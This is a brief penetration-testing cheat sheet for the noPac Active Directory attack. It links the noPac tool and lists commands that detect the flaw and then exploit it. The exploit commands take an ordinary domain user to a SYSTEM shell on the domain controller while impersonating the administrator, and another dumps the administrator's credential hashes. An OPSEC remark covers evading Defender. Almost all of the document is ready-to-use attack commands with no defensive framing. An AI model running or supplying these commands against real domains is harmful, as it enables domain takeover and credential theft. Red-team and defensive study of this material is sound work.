---
tags:
  - Authenticated
  - Domain-Admin
  - Lateral-Movement
  - Local
  - Privilege-Escalation
  - AD
---
[https://github.com/Ridter/noPac.git](https://github.com/Ridter/noPac.git)
## Identify
---
```PowerShell
sudo python3 scanner.py domain.local/user:'password' -dc-ip <DCIP> -use-ldap
```
nxc:
```bash
nxc smb <ip> -u 'user' -p 'pass' -M nopac
```

## Exploit
---
```PowerShell
sudo python3 noPac.py DOMAIN.LOCAL/user:'pass' -dc-ip <dcip>  -dc-host DC01 -shell --impersonate administrator -use-ldap
```

```PowerShell
sudo python3 noPac.py DOMAIN.LOCAL/user:'pass' -dc-ip <dcip>  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user DOMAIN/administrator
```

!!! alert "OPSEC: will spawn a SYSTEM shell with smbsexec - shell may establish but defender will likely block further execution."